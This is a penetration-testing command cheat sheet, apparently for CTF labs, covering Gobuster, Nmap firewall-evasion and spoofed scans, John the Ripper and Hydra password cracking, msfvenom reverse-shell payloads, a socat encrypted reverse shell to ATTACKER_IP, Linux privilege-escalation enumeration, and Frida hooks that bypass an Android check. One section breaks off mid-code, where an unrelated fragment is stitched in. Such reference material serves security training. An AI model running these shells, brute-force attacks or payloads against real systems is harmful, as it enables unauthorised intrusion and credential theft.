docs.title: Gobuster
docs.text: Brute-force directory, file, DNS subdomain and vhost enumeration.

docs.title: Directory & File Enumeration
docs.text:
# basic
gobuster dir -u "http://<IP>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# with file extensions
gobuster dir -u "http://<IP>" -w <wordlist> -x php,html,txt,js

# authenticated + follow redirects + high threads
gobuster dir -u "http://<IP>" -w <wordlist> -U admin -P password -r -t 64

# skip TLS validation (self-signed certs in CTFs)
gobuster dir -u "https://<IP>" -w <wordlist> -k

# save output
gobuster dir -u "http://<IP>" -w <wordlist> -o results.txt

Tip

Gobuster does not recurse. If you find a directory, re-run explicitly on that path.

docs.title: Key dir Flags
docs.text: Flag Description -u Target URL -w Wordlist path -x File extensions to look for -t Threads (default 10, use 64 for speed) -r Follow redirects -k Skip TLS certificate validation -o Output file -b Status codes to blacklist (e.g. 404,403) -s Status codes to show --delay Delay between requests (evade rate limiting)

docs.title: Virtual Host Enumeration
docs.text:
gobusterffuf 
# vhost enum — filter false positives by response size
gobuster vhost -u "http://<IP>" \
      --domain example.thm \
      -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
      --append-domain \
      --exclude-length 250-320

ffuf -w <wordlist> -H "Host: FUZZ.example.thm" -u http://<IP> -fs <size>
Tip

Run without --exclude-length first to see the size of false positive responses, then filter by that size.

docs.title: Nmap
docs.text: Network scanner. Port discovery, service version detection, NSE scripts, firewall evasion.

docs.title: Quick Reference
docs.text:
# fast default scan
nmap -sV -sC -oN scan.txt <IP>

# full port scan + version + scripts
nmap -p- -sV -sC -T4 -oA full <IP>

# UDP top 20
nmap -sU --top-ports 20 <IP>

# Decoy scan
nmap -D <DECOY_IP>,ME <MACHINE_IP>

# Custom TCP scan
sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP

# Spoofed Source IP
sudo nmap -S <SPOOFED_IP> <MACHINE_IP>

# ping sweep (host discovery)
nmap -sn 192.168.0.0/24

docs.title: Key Flags
docs.text: Flag Description -sS SYN/stealth scan (default w/ sudo) -sT TCP connect scan (default without sudo) -sU UDP scan (slow) -sV Service version detection -sC Default NSE scripts -O OS detection -p- All 65535 ports -p 80,443 Specific ports -T0..5 Timing (T4 = fast, T5 = insane/noisy) -oN / -oG / -oA Output: normal / grepable / all formats -Pn Skip host discovery (bypass ICMP block) -v / -vv Verbose output -d / -d Debug details -reason Explains how Nmap made its conclusion

docs.title: NSE Scripts
docs.text:
# run a category
nmap --script=vuln <IP>

# run a specific script
nmap --script=http-fileupload-exploiter <IP>

# multiple scripts
nmap --script=smb-enum-users,smb-enum-shares <IP>

# script with arguments
nmap -p 80 --script http-put \
  --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' <IP>

# find scripts locally
grep "ftp" /usr/share/nmap/scripts/script.db
ls /usr/share/nmap/scripts/*ftp*

# install a new script
sudo wget -O /usr/share/nmap/scripts/<name>.nse \
  https://svn.nmap.org/nmap/scripts/<name>.nse

nmap --script-updatedb
Script categories

Most important: safe, intrusive, vuln, exploit, auth, brute, discovery

docs.title: Stealth & Firewall Evasion
docs.text:
Null / FIN / XMAS — bypass SYN-filtering firewalls

nmap -sN <IP>   # Null  — no flags set
nmap -sF <IP>   # FIN
nmap -sX <IP>   # XMAS  (PSH+URG+FIN)

# fragment packets (evade some IDS)
nmap -f <IP> # (1)!

  1. -ff to fragment data into 16 bytes 
# control MTU (must be multiple of 8)
nmap --mtu 16 <IP>

# add scan delay
nmap --scan-delay 500ms <IP>

# detect firewall (bad checksum: legit hosts won't respond)
nmap --badsum <IP> # (1)!
  1. Sends packets with invalid checksums. Legit hosts drop them silently. Firewalls often respond automatically, revealing themselves.
# append random data to packets
nmap --data-length 25 <IP>

Warning

NULL (-sN) / FIN (-sF) / XMAS (-sX) show ports as open|filtered. Windows often responds with RST for all ports regardless, making results unreliable.

docs.title: John the Ripper
docs.text:
# auto detect hash type
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# list all formats
john --list=formats | grep -i md5

# specific format
john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=raw-sha1 --wordlist=rockyou.txt hash.txt
john --format=Raw-SHA256 --wordlist=rockyou.txt hash.txt
john --format=nt --wordlist=rockyou.txt hash.txt        # NTLM
john --format=sha512crypt --wordlist=rockyou.txt hash.txt

docs.title: Crack /etc/shadow
docs.text:
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt

docs.title: Crack zip / rar / SSH key
docs.text:
# zip
zip2john file.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt

# rar
rar2john file.rar > rar_hash.txt
john --wordlist=rockyou.txt rar_hash.txt

# SSH key
ssh2john id_rsa > id_rsa_hash.txt
john --wordlist=rockyou.txt id_rsa_hash.txt

docs.title: Single crack mode (username-based mangling)
docs.text:
# prepend username to hash file first:
# joker:7bf6d9bb82bed1302f331fc6b816aada
john --single --format=raw-md5 hash.txt # (1)!
  1. In this mode, John uses only the information provided in the username to try and work out possible passwords heuristically by slightly changing the letters and numbers contained within the username. E.g. Markus!, MaRkus$, MarKus2 etc.

docs.title: Custom rules
docs.text:
Defined in john.conf. Example rule for Polopassword1! pattern: 

[List.Rules:PoloPassword]
cAz"[0-9] [!£$%@]"

john --wordlist=rockyou.txt --rule=PoloPassword hash.txt # (1)!
  1. Generate a wordlist from the rules that would match the example password Polopassword1! (assuming the word polopassword was in our wordlist).

docs.title: Hydra
docs.text:
# SSH brute force
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> -t 4 ssh

# FTP
hydra -l <user> -P rockyou.txt ftp://<IP>

# HTTP POST form
hydra -l <user> -P rockyou.txt <IP> \
  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V # (1)!

  1. F=incorrect is the string that appears in the response when login fails. Use Burp to confirm the exact string.
# unknown username — try a list
hydra -L users.txt -P rockyou.txt <IP> ssh

docs.title: Msfvenom Payloads
docs.text:
# list all payloads
msfvenom --list payloads | grep windows

# Windows x64 reverse shell (stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Windows staged meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux x64 reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php

# Windows MSI (AlwaysInstallElevated privesc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o malicious.msi

# exe-service (for service replacement privesc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe-service -o rev-svc.exe
Staged vs Stageless

Staged = shell/reverse_tcp (slash in name -> needs multi/handler). Stageless = shell_reverse_tcp (underscore -> self-contained).

docs.title: Encrypted Shell (Socat + OpenSSL)
docs.text:
# generate cert on attacker
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem

# listener (attacker)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# connect (target)
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

docs.title: Identify SSRF
docs.text:
Look for parameters that take URLs: ?url=, ?image=, ?srv=, ?file=, ?path=

# target internal services

docs.title: RSA Decryption (Python)
docs.text:
from Crypto.Util.number import inverse

p = 430535396861370041
q = 17209058493553260637
n = p * q
e = 257
c = 3086274334409993602095103985623480747

totient = (p-1) * (q-1)
d = inverse(e, totient)
m = pow(c, d, n)

plaintext = bytes.fromhex(hex(m)[2:]).decode('ASCII')
print(plaintext)

docs.title: Enumeration Checklist
docs.text:
# system info
hostname; uname -a; cat /proc/version; cat /etc/issue
id; whoami; sudo -l

# users
cat /etc/passwd | cut -d: -f1
cat /etc/shadow   # if readable
history

# network — internal services?
ip a; ip route
netstat -tulpn
ss -tulpn

# processes

ps axjf   # process tree

# SUID / SGID binaries
find / -type f -perm -04000 -ls 2>/dev/null

# world-writable directories

# cron jobs
cat /etc/crontab
ls /etc/cron.*

# capabilities

  cls.check.overload("java.lang.String").implementation = function(s) {
    console.log("[*] param:", s.toString());
    return true;   // bypass check
  };
});

docs.title: Extracting Secrets
docs.text:
Hook the decryption function and reconstruct the chain from Jadx source to get the plaintext secret at runtime.

Java.perform(() => {
  const base64   = Java.use("android.util.Base64");
  const bClass   = Java.use("sg.vantagepoint.uncrackable1.a");
  const aClass   = Java.use("sg.vantagepoint.a.a");
  const strClass = Java.use("java.lang.String");

  const ciphertext = base64.decode(
    "5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=", 0
  );
  const key       = bClass.b("8d127684cbc37c17616d806cf50473cc");
  const decrypted = aClass.a(key, ciphertext);

  console.log("Secret:", strClass.$new(decrypted));
});

Tip

Always decompile the APK with Jadx first and trace the call chain before writing Frida scripts. Understand what the app is doing before you hook it.
